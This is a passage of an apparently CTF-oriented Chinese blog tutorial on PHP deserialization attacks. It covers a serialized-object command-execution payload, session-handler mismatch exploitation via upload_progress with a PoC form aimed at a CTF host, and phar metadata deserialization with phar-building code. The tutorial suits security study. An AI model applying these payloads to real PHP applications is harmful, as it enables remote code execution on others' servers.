</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$pp</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;O:1:</span><span style="color:#a6be9d">\&#34;</span><span style="color:#a6be9d">A</span><span style="color:#a6be9d">\&#34;</span><span style="color:#a6be9d">:1:{s:4:</span><span style="color:#a6be9d">\&#34;</span><span style="color:#a6be9d">test</span><span style="color:#a6be9d">\&#34;</span><span style="color:#a6be9d">;s:&#34;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">$len</span><span style="color:#ff636f">.</span><span style="color:#a6be9d">&#34;:</span><span style="color:#a6be9d">\&#34;</span><span style="color:#a6be9d">&#34;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">$test</span><span style="color:#ff636f">.</span><span style="color:#a6be9d">&#34;;</span><span style="color:#a6be9d">\&#34;</span><span style="color:#a6be9d">;}&#34;</span>; <span style="color:#828b96;font-style:italic">// 构造序列化对象，用我们POST传过去的命令代码字符串覆盖$test=&#34;demo&#34;，从而执行恶意命令。 
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$test_unser</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">unserialize</span>(<span style="color:#58a1dd">$pp</span>); <span style="color:#828b96;font-style:italic">// 反序列化同时触发_destruct函数 
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#828b96;font-style:italic">?&gt;</span>
</span></span></code></pre></div><h1 id="session反序列化" class="heading-element"><span>session反序列化</span>
  <a href="#session%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><blockquote>
<p>选择不同的处理器，处理方式也不一样，如果序列化和储存session与反序列化的方式不同，就有可能导致漏洞的产生。</p>
<p><a href="https://github.com/80vul/phpcodz/blob/master/research/pch-013.md"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/80vul/phpcodz/blob/master/research/pch-013.md</a></p>
<p>我之前一直不理解session是怎么影响到当前php脚本的，现在懂了一些，==当 PHP 停止的时候，它会自动读取 内存中<code>$_SESSION</code> 中的内容，并将其进行<code>序列化</code>， 然后发送给会话保存管理器来进行保存（持久化存储在硬盘上）。==也就是session被序列化的时候，那我猜session进行反序列化的时候就是用户传过来sessid并且确实存在这个会话id的时候，这个时候硬盘中的sess_文件内容会被反序列化取出到内存中，那么这里也能看出来==用户越多的时候对服务器的内存压力是越大的==。</p>
<p>那么这个漏洞的利用过程大概是：</p>
<p>一、题目ini配置满足session内容的自定义上传 ，上传过程中存储在$_SESSION,结束后根据==php.ini中规定的处理器==进行持久化存储（因为当前并没有执行这个题目的php脚本）</p>
<p>二、存在session序列化处理器不同的漏洞 ，发起会话读取这个题目的页面时，session会被从sess_文件中读取并根据==当前php脚本中ini_set规定的处理器==进行反序列化，这个时候正在被反序列化的字符串（我们构造的payload）刚好与当前执行的php脚本契合，那这个session存储的序列化内容就被反序列化执行了</p>
</blockquote>
<p>默认情况下，PHP 使用内置的文件会话保存管理器来完成<code>session</code>的保存，也可以通过配置项 <code>session.save_handler</code> 来修改所要采用的会话保存管理器。 对于文件会话保存管理器，会将会话数据保存到配置项<code>session.save_path</code>所指定的位置。</p>
<p>PHP session在php.ini中有很多配置项，<code>PHP session</code>的存储机制是由<code>session.serialize_handler</code>来定义引擎的，默认是以文件的方式存储，且存储的文件是由<code>sess_sessionid</code>来决定文件名的，当然这个文件名也不是不变的</p>
<p><strong>php.ini中一些==Session配置==：</strong>
1、session.save_path=&quot;&quot; &ndash;设置session的存储路径
2、session.save_handler=&quot;&quot;&ndash;设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)
3、session.auto_start boolen&ndash;指定会话模块是否在请求开始时启动一个会话默认为0不启动
4、session.serialize_handler string&ndash;定义用来序列化/反序列化的处理器名字。默认使用php</p>
<p><strong>常见的php-==session存放位置==有</strong>：
1、/var/lib/php5/sess_PHPSESSID
2、/var/lib/php7/sess_PHPSESSID
3、/var/lib/php/sess_PHPSESSID
4、/tmp/sess_PHPSESSID 5 /tmp/sessions/sess_PHPSESSED
5、phpstudy集成环境下在php.ini里查找session.save_path，也可以在这里更改路径</p>
<hr>
<p><code>session.serialize_handler</code>定义的引擎有三种，如下表所示：</p>
<table>
<thead>
<tr>
<th>处理器名称</th>
<th>存储格式</th>
</tr>
</thead>
<tbody>
<tr>
<td>php</td>
<td>键名 + 竖线 + 经过<code>serialize()</code>函数序列化处理的值</td>
</tr>
<tr>
<td>php_binary</td>
<td>键名的长度对应的 ASCII 字符 + 键名 + 经过<code>serialize()</code>函数序列化处理的值</td>
</tr>
<tr>
<td>php_serialize</td>
<td>经过serialize()函数序列化处理的<strong>数组</strong></td>
</tr>
</tbody>
</table>
<ul>
<li>
<p>php</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">error_reporting</span>(<span style="color:#a6be9d">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">ini_set</span>(<span style="color:#a6be9d">&#39;session.serialize_handler&#39;</span>,<span style="color:#a6be9d">&#39;php&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">session_start</span>();
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$_SESSION</span>[<span style="color:#a6be9d">&#39;session&#39;</span>] <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$_GET</span>[<span style="color:#a6be9d">&#39;session&#39;</span>];
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">?&gt;</span>
</span></span></code></pre></div><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161431767.png" alt="image-20230316143103687" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161431767.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161431767.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161431767.png?size=large 2x" data-title="image-20230316143103687" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>C|s:8:&ldquo;flag.php&rdquo;;</p>
</li>
<li>
<p>php_binary</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">error_reporting</span>(<span style="color:#a6be9d">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">ini_set</span>(<span style="color:#a6be9d">&#39;session.serialize_handler&#39;</span>,<span style="color:#a6be9d">&#39;php_binary&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">session_start</span>();
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$_SESSION</span>[<span style="color:#a6be9d">&#39;sessionsessionsessionsessionsession&#39;</span>] <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$_GET</span>[<span style="color:#a6be9d">&#39;session&#39;</span>];
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">?&gt;</span>
</span></span></code></pre></div><p><code>#</code>为键名长度对应的 ASCII 的值，<code>sessionsessionsessionsessionsessions</code>为键名，<code>s:7:&quot;xianzhi&quot;;</code>为传入 GET 参数经过序列化后的值</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305242307533.webp" alt="image-20230316143333179" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305242307533.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305242307533.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305242307533.webp?size=large 2x" data-title="image-20230316143333179" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
</li>
<li>
<p>php_serialize</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">error_reporting</span>(<span style="color:#a6be9d">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">ini_set</span>(<span style="color:#a6be9d">&#39;session.serialize_handler&#39;</span>,<span style="color:#a6be9d">&#39;php_serialize&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">session_start</span>();
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$_SESSION</span>[<span style="color:#a6be9d">&#39;session&#39;</span>] <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$_GET</span>[<span style="color:#a6be9d">&#39;session&#39;</span>];
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">?&gt;</span>
</span></span></code></pre></div><p><code>a:1</code>表示<code>$_SESSION</code>数组中有 1 个元素，花括号里面的内容即为传入 GET 参数经过序列化后的值</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161435046.png" alt="image-20230316143510975" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161435046.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161435046.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161435046.png?size=large 2x" data-title="image-20230316143510975" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
</li>
</ul>
<p><code>上传进度支持（session.upload_progress）</code></p>
<blockquote>
<p>当在php.ini中设置session.upload_progress.enabled = On的时候，PHP将能够跟踪上传单个文件的上传进度。当上传正在进行时，以及在将与session.upload_progress.name INI设置相同的名称的变量设置为POST时，上传进度将在$ _SESSION超全局中可用。</p>
</blockquote>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161633585.png" alt="image-20230316163338518" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161633585.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161633585.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161633585.png?size=large 2x" data-title="image-20230316163338518" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p><code>poc</code></p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">&lt;!DOCTYPE html&gt;</span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#58a1dd">html</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#58a1dd">head</span>&gt;
</span></span><span style="display:flex;"><span>	&lt;<span style="color:#58a1dd">title</span>&gt;A_dmin&lt;/<span style="color:#58a1dd">title</span>&gt;
</span></span><span style="display:flex;"><span>	&lt;<span style="color:#58a1dd">meta</span> <span style="color:#58a1dd">charset</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;utf-8&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#58a1dd">head</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#58a1dd">body</span>&gt;
</span></span><span style="display:flex;"><span>	&lt;<span style="color:#58a1dd">form</span> <span style="color:#58a1dd">action</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;http://web.jarvisoj.com:32784/index.php&#34;</span> <span style="color:#58a1dd">method</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;POST&#34;</span> <span style="color:#58a1dd">enctype</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;multipart/form-data&#34;</span>&gt;
</span></span><span style="display:flex;"><span>	    &lt;<span style="color:#58a1dd">input</span> <span style="color:#58a1dd">type</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;hidden&#34;</span> <span style="color:#58a1dd">name</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;PHP_SESSION_UPLOAD_PROGRESS&#34;</span> <span style="color:#58a1dd">value</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;123&#34;</span> /&gt;
</span></span><span style="display:flex;"><span>	    &lt;<span style="color:#58a1dd">input</span> <span style="color:#58a1dd">type</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;file&#34;</span> <span style="color:#58a1dd">name</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;file&#34;</span> /&gt;
</span></span><span style="display:flex;"><span>	    &lt;<span style="color:#58a1dd">input</span> <span style="color:#58a1dd">type</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;submit&#34;</span> <span style="color:#58a1dd">value</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;submit&#34;</span> /&gt;
</span></span><span style="display:flex;"><span>	&lt;/<span style="color:#58a1dd">form</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#58a1dd">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#58a1dd">html</span>&gt;</span></span></code></pre></div><p>抓包修改，在序列化的字符串前加 |，提交即可。</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161719411.png" alt="image-20230316171920324" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161719411.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161719411.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161719411.png?size=large 2x" data-title="image-20230316171920324" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<h1 id="phar反序列化" class="heading-element"><span>phar反序列化</span>
  <a href="#phar%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p>phar反序列化即在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作。</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305242310541.webp" alt="image-20230524231049353" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305242310541.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305242310541.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305242310541.webp?size=large 2x" data-title="image-20230524231049353" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p><a href="https://paper.seebug.org/680/"target="_blank" rel="external nofollow noopener noreferrer">https://paper.seebug.org/680/</a></p>
<h2 id="漏洞利用条件" class="heading-element"><span>漏洞利用条件</span>
  <a href="#%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8%e6%9d%a1%e4%bb%b6" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ol>
<li>phar文件要能够上传到服务器端。</li>
<li>要有可用的魔术方法作为“跳板”。</li>
<li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</li>
</ol>
<h2 id="文件结构" class="heading-element"><span>文件结构</span>
  <a href="#%e6%96%87%e4%bb%b6%e7%bb%93%e6%9e%84" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>phar文件是php里类似于JAR的一种打包文件本质上是一种压缩文件，在PHP 5.3 或更高版本中默认开启，一个phar文件一个分为四部分</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#a6be9d">1</span>.<span style="color:#58a1dd">a</span> <span style="color:#58a1dd">stub</span>
</span></span><span style="display:flex;"><span>可以理解为一个标志，格式为<span style="color:#58a1dd">xxx</span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span> <span style="color:#58a1dd">xxx</span>; <span style="color:#58a1dd">__HALT_COMPILER</span>();<span style="color:#ff636f">?&gt;</span>，前面内容不限，但必须以<span style="color:#58a1dd">__HALT_COMPILER</span>();来结尾，否则<span style="color:#58a1dd">phar扩展将无法识别这个文件为phar文件</span>
</span></span><span style="display:flex;"><span><span style="color:#a6be9d">2</span>.<span style="color:#58a1dd">a</span> <span style="color:#58a1dd">manifest</span> <span style="color:#58a1dd">describing</span> <span style="color:#58a1dd">the</span> <span style="color:#58a1dd">contents</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">phar文件本质上是一种压缩文件</span>，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的<span style="color:#58a1dd">meta</span><span style="color:#ff636f">-</span><span style="color:#ff636f">data</span>，这是上述攻击手法最核心的地方
</span></span><span style="display:flex;"><span><span style="color:#a6be9d">3</span>.<span style="color:#58a1dd">the</span> <span style="color:#58a1dd">file</span> <span style="color:#58a1dd">contents</span>
</span></span><span style="display:flex;"><span>被压缩文件的内容
</span></span><span style="display:flex;"><span><span style="color:#a6be9d">4</span>.[<span style="color:#58a1dd">optional</span>] <span style="color:#58a1dd">a</span> <span style="color:#58a1dd">signature</span> <span style="color:#ff636f">for</span> <span style="color:#58a1dd">verifying</span> <span style="color:#58a1dd">Phar</span> <span style="color:#58a1dd">integrity</span> (<span style="color:#58a1dd">phar</span> <span style="color:#58a1dd">file</span> <span style="color:#58a1dd">format</span> <span style="color:#ff636f">only</span>)
</span></span><span style="display:flex;"><span>签名，放在文件末尾</span></span></code></pre></div><h2 id="生成phar" class="heading-element"><span>生成phar</span>
  <a href="#%e7%94%9f%e6%88%90phar" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>需要提前配置php.ini</p>
<blockquote>
<p><strong>要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。</strong></p>
</blockquote>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">class</span> <span style="color:#58a1dd">TestObject</span> {
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">@</span><span style="color:#58a1dd">unlink</span>(<span style="color:#a6be9d">&#34;phar.phar&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">$phar</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">Phar</span>(<span style="color:#a6be9d">&#34;phar.phar&#34;</span>); <span style="color:#828b96;font-style:italic">//后缀名必须为phar
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>    <span style="color:#58a1dd">$phar</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">startBuffering</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">$phar</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">setStub</span>(<span style="color:#a6be9d">&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;</span>); <span style="color:#828b96;font-style:italic">//设置stub
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>    <span style="color:#58a1dd">$o</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">TestObject</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">$phar</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">setMetadata</span>(<span style="color:#58a1dd">$o</span>); <span style="color:#828b96;font-style:italic">//将自定义的meta-data存入manifest 核心
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>    <span style="color:#58a1dd">$phar</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">addFromString</span>(<span style="color:#a6be9d">&#34;test.txt&#34;</span>, <span style="color:#a6be9d">&#34;test&#34;</span>); <span style="color:#828b96;font-style:italic">//添加要压缩的文件
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>    <span style="color:#828b96;font-style:italic">//签名自动计算
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>    <span style="color:#58a1dd">$phar</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">stopBuffering</span>();
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">?&gt;</span>
</span></span></code></pre></div><h2 id="利用" class="heading-element"><span>利用</span>
  <a href="#%e5%88%a9%e7%94%a8" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><h3 id="触发phar的函数" class="heading-element"><span>触发phar的函数</span>
  <a href="#%e8%a7%a6%e5%8f%91phar%e7%9a%84%e5%87%bd%e6%95%b0" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p><a href="https://blog.zsxsoft.com/post/38"target="_blank" rel="external nofollow noopener noreferrer">https://blog.zsxsoft.com/post/38</a></p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#58a1dd">fopen</span>()
